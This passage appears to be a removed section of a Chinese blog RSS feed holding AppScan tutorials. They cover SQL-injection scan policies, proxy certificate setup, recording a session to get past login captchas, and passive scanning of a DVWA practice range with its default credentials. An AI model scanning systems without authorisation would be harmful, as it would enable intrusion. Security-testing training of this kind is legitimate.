-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6b9c37b2f38744c499373f48b7c7466e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 点击【测试策略】，选择【缺省值】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/cda5ef11493848ee9431d497e693fff5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 将所有的选中状态去掉&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/832603718ecc4424a80ee7907253d79f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 搜索 sql 注入&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/71eed16ff0ce4cd69ad97e6815d5e36b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 展开全选该漏洞的 pload&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c6ffc56796ae4b5f8c78e70633b7b55b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击【应用】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c17d8474fb044dcfa9fc2f32e5bf5ceb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 点击【导出】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/e2071bd37d6641aa92c003bfb570f143.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 选择喜欢的位置保存&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/b75c613fc42b48f6a80ba270be667ae2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【导入】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/a75ab821e297455989669f00ae32795f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 选则需要的自定义策略&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6026d155a3164ec396ca75796f63432c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/fa0211647f8c4fe3be38710e2de6b8be.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 点击【手动扫描】，选择【AppScan Chromium 浏览器】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/f2167c67d48b4feb989384b52ab805fb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;17. 选则要探索的页面，然后点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/24f2de24301b4d92a9d3cbeebfb9bd97.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;18. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/1609886d3eae47f29af655201b45d55a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;19. 等待加载完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/9cf3cea101ae41c4b2e9262d58988b1e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;20. 点击【扫描】，选择【仅测试】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/8b9305d524584c41b7257845bc43e999.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;21. 等待测试结果&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/cc5a78f3e4a34902a888da3f4785e63c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/eb7431b64b194406a0548243f877c9f9.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
-i&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AppScan%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B7%B1%E5%85%A5%E6%89%AB%E6%8F%8F/</guid>
-            <title>AppScan绕过登录验证码深入扫描</title>
-            <link>https://mangpumo.github.io/2023/01/11/AppScan%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B7%B1%E5%85%A5%E6%89%AB%E6%8F%8F/</link>
-            <pubDate>Wed, 11 Jan 2023 05:34:10 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;绕过登录验证码深入扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过登录验证码深入扫描&#34;&gt;#&lt;/a&gt; 绕过登录验证码深入扫描&lt;/h1&gt;
-&lt;p&gt;我们工作中最长碰到的工作场景是网站采用 https 协议，这时我们要用 appScan 进行扫描时，就需要先安装证书&lt;/p&gt;
-&lt;h2 id=&#34;1证书安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1证书安装&#34;&gt;#&lt;/a&gt; 1. 证书安装&lt;/h2&gt;
-&lt;p&gt;1. 新建一个文件，点击【文件】，点击【新建】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c2cfd88d4b714cdab43af4c8e7cdb06d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 选择【扫描 web 应用程序】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c2c466aa8c474c8285cfedea2cd4e819.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【取消】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/4bdc797b5c1a4b0db90df2164600a0ce.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【手动扫描】，选择【外部设备】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/cab4a5ef42054822941f0831e9498498.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 记录代理端口&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/3d64ba27c5084853a0a3dbdfff736651.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 点击【记录代理配置】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/704f20425aa2482fa6bfdacf166f7c19.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【记录代理】, 点击【导出】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/646d91731ece4fce965495fb0af02830.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 选择喜欢的位置，点击【保存】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/19cc1e3e724a4d01b63b8a62fa8b6437.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击【取消】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/4429279212ee445bada658d51e2081ae.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 解压已经保存的证书&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/fb6f8a02302f49c7979a7d3911228e9b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 切换到火狐浏览器，点击【更多】，点击【设置】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/183fa51ed27a4fb9a29bf53145876b97.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 输入证书，点击【回车】，点击【查看证书】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/72039d699ea14ed59b691f2f3bdbb9eb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【证书颁发机构】，点击【导入】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/640bf9059f674c2eae885b39eca32392.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 选择证书，点击【打开】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/0eb3191f0ec845bc86bbc171ecc0f45c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 勾选信任证书，点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/ff7fb370aec84bf7bb00d407e92ae443.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/d782b58bd4e14794aad272ebf192947a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;2手工探测绕过登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2手工探测绕过登录&#34;&gt;#&lt;/a&gt; 2. 手工探测绕过登录&lt;/h2&gt;
-&lt;p&gt;扫描过程会遇到网站 存在 手机验证码，图形验证码，滑动验证等等，这时候想要深度扫描时，就需要进行登录绕过。有两种方法可以选择&lt;/p&gt;
-&lt;p&gt;第一：使用第三节课介绍的定制头解决&lt;/p&gt;
-&lt;p&gt;第二：使用手工探索 - 外置设备进行登录绕过，我们今天讲解第二种&lt;/p&gt;
-&lt;p&gt;1. 新建一个文件，点击【文件】，点击【新建】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c2cfd88d4b714cdab43af4c8e7cdb06d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 选择【扫描 web 应用程序】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c2c466aa8c474c8285cfedea2cd4e819.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 输入被测网址，点击【下一步】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/df15f4f11ddc4368a9f2225e6e52b131.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【记录】, 点击【AppScan Chromium 浏览器】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/655fdfe74d934406ada64b9800aafe91.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 进行登录&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/ebf536ebb6e44530b40a28df07d0784f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 点击【我已登录到站点】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/128a98bf975040cba4ffb2204623e16a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/3a5c95f334bc40df86c1db022798bfba.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/dceb8d324cc04ac1bed635a6f4d34d62.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;可以看到，登录回放是失败，遇到这种情况，我们今天使用手工探索 - 外置设备进行登录绕过&lt;/p&gt;
-&lt;p&gt;7. 点击【关闭】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/873586ce76cd43cb925bc6cc216f9569.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 点击【取消】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/14cc3447348f44ed89a023bf07863d5c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击【取消】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/9ea29ca3ecbb4f3387d2efd2187b002b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击【手动扫描】，选择【外部设备】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/cab4a5ef42054822941f0831e9498498.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 记录代理端口&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/02cc9d867b9d4ae4b4cceb505a271d18.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 切到火狐浏览器，进入被测网站，登录&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c26acb3fb5c4422b86274cf8d2c256e9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【代理】，点击【选项】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/a6a9e71178ae40a29a238b632a87cfc0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 点击【编辑】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/9a8cf830b95a4d93899a0a64672f691c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 输入 AppScan 的端口，点击【保存】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/883d17b276b24cec95950f80d64e7642.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 切换到被测网站，点击【代理】，选择【appscan】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c89091852abb4fc5b6f7a6f06fa594ef.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;17. 点击想要测试功能&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/63d15e0c22fc40b99974ef30daa4f687.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/2723ab0161b7436aa7cb9f8c903789a0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;18. 点击【停止记录】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/3b26cf2705b04f98bfc8e3abedd75003.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;19. 选择被测网站，点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/d8a705be72e0435e963f93efe07c4fa7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;20. 等待流量加载完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/030b485295774299b3b5c71da4e1d48b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;21. 点击【扫描】，点击【仅测试】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/ad65b72debe443fdb80dcbe019654dcf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;22. 等待测试结果&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/e9c9f52f51bb4138b66f3a0524f14311.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/8330ddbad423477a8f66206c6c07bf1c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AppScan%E8%A2%AB%E5%8A%A8%E6%89%8B%E5%8A%A8%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F/</guid>
-            <title>AppScan被动手动探索扫描</title>
-            <link>https://mangpumo.github.io/2023/01/11/AppScan%E8%A2%AB%E5%8A%A8%E6%89%8B%E5%8A%A8%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F/</link>
-            <pubDate>Wed, 11 Jan 2023 05:33:02 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;appscan被动手动探索扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appscan被动手动探索扫描&#34;&gt;#&lt;/a&gt; AppScan 被动手动探索扫描&lt;/h1&gt;
-&lt;p&gt;被动式扫描：浏览器代理到 AppScan，然后进行手工操作，探索产生出的流量给 AppScan 进行扫描。&lt;/p&gt;
-&lt;p&gt;他的优点是：扫描足够精准，覆盖率更加高，减少不必要的干扰包等等&lt;/p&gt;
-&lt;h2 id=&#34;1扫描基础准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1扫描基础准备&#34;&gt;#&lt;/a&gt; 1. 扫描基础准备&lt;/h2&gt;
-&lt;h3 id=&#34;1火狐安装foxyproxy&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1火狐安装foxyproxy&#34;&gt;#&lt;/a&gt; 1. 火狐安装 FoxyProxy&lt;/h3&gt;
-&lt;p&gt;1. 打开扩展和主题&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;about:addons&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;2. 输入 FoxyProxy 点击【回车】搜索&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101102542.png&#34; alt=&#34;image-20211220101102542&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击 【FoxyProxy Standard】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101117058.png&#34; alt=&#34;image-20211220101117058&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【添加到 Firefox】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101133106.png&#34; alt=&#34;image-20211220101133106&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;2马士兵靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2马士兵靶场&#34;&gt;#&lt;/a&gt; 2. 马士兵靶场&lt;/h3&gt;
-&lt;p&gt;1. 进入靶场&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://www.bafangwy.com/battle&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;2. 启动 dvwa 靶场&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101210330.png&#34; alt=&#34;image-20211220101210330&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101218208.png&#34; alt=&#34;image-20211220101218208&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 访问靶场&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://39.101.162.123:64936/login.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;password&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;4. 设置安全等级为 low&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101245688.png&#34; alt=&#34;image-20211220101245688&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101251950.png&#34; alt=&#34;image-20211220101251950&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;2扫描步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2扫描步骤&#34;&gt;#&lt;/a&gt; 2. 扫描步骤&lt;/h2&gt;
-&lt;h3 id=&#34;1选择扫描-手动探索-外部设备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1选择扫描-手动探索-外部设备&#34;&gt;#&lt;/a&gt; 1 选择【扫描】--【手动探索】--【外部设备】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101317215.png&#34; alt=&#34;image-20211220101317215&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101326318.png&#34; alt=&#34;image-20211220101326318&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;2火狐浏览器点击代理-选择选项&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2火狐浏览器点击代理-选择选项&#34;&gt;#&lt;/a&gt; 2. 火狐浏览器点击【代理】-- 选择【选项】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101344037.png&#34; alt=&#34;image-20211220101344037&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;3点击添加&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3点击添加&#34;&gt;#&lt;/a&gt; 3. 点击【添加】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101355972.png&#34; alt=&#34;image-20211220101355972&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;4输入标题appsacn添加ip127001添加端口49729点击保存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4输入标题appsacn添加ip127001添加端口49729点击保存&#34;&gt;#&lt;/a&gt; 4. 输入标题【appsacn】，添加 ip【127.0.0.1】，添加端口【49729】，点击保存&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101409923.png&#34; alt=&#34;image-20211220101409923&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101417072.png&#34; alt=&#34;image-20211220101417072&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;5开启代理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5开启代理&#34;&gt;#&lt;/a&gt; 5. 开启代理&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101432626.png&#34; alt=&#34;image-20211220101432626&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;6操作被测网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6操作被测网站&#34;&gt;#&lt;/a&gt; 6. 操作被测网站&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101444737.png&#34; alt=&#34;image-20211220101444737&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;7切换到appscan-点击停止记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7切换到appscan-点击停止记录&#34;&gt;#&lt;/a&gt; 7. 切换到 appScan 点击【停止记录】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101456598.png&#34; alt=&#34;image-20211220101456598&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;8选择网站点击确定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8选择网站点击确定&#34;&gt;#&lt;/a&gt; 8. 选择网站，点击【确定】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101508810.png&#34; alt=&#34;image-20211220101508810&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101515856.png&#34; alt=&#34;image-20211220101515856&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;9点击扫描选择仅测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9点击扫描选择仅测试&#34;&gt;#&lt;/a&gt; 9. 点击【扫描】，选择【仅测试】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101534029.png&#34; alt=&#34;image-20211220101534029&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;10点击是&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10点击是&#34;&gt;#&lt;/a&gt; 10. 点击【是】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101544955.png&#34; alt=&#34;image-20211220101544955&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;11选则储存位置点击保存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11选则储存位置点击保存&#34;&gt;#&lt;/a&gt; 11. 选则储存位置，点击保存&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101556686.png&#34; alt=&#34;image-20211220101556686&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;12等待测试结果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12等待测试结果&#34;&gt;#&lt;/a&gt; 12. 等待测试结果&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101609909.png&#34; alt=&#34;image-20211220101609909&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101617427.png&#34; alt=&#34;image-20211220101617427&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;3appscan内置浏览器扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3appscan内置浏览器扫描&#34;&gt;#&lt;/a&gt; 3.appscan 内置浏览器扫描&lt;/h2&gt;
-&lt;h3 id=&#34;1点击手动探索选则appscan-chromium-浏览器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1点击手动探索选则appscan-chromium-浏览器&#34;&gt;#&lt;/a&gt; 1. 点击【手动探索】，选则【AppScan Chromium 浏览器】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101630427.png&#34; alt=&#34;image-20211220101630427&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;2点击是&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2点击是&#34;&gt;#&lt;/a&gt; 2. 点击【是】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101650772.png&#34; alt=&#34;image-20211220101650772&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;3输入url-点击确定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3输入url-点击确定&#34;&gt;#&lt;/a&gt; 3. 输入 URL 点击【确定】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101703074.png&#34; alt=&#34;image-20211220101703074&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;4点击取消&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4点击取消&#34;&gt;#&lt;/a&gt; 4. 点击取消&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101715529.png&#34; alt=&#34;image-20211220101715529&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;5点击配置-参数和cookie-定制头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5点击配置-参数和cookie-定制头&#34;&gt;#&lt;/a&gt; 5. 点击【配置】--【参数和 cookie】--【定制头】&lt;/h3&gt;
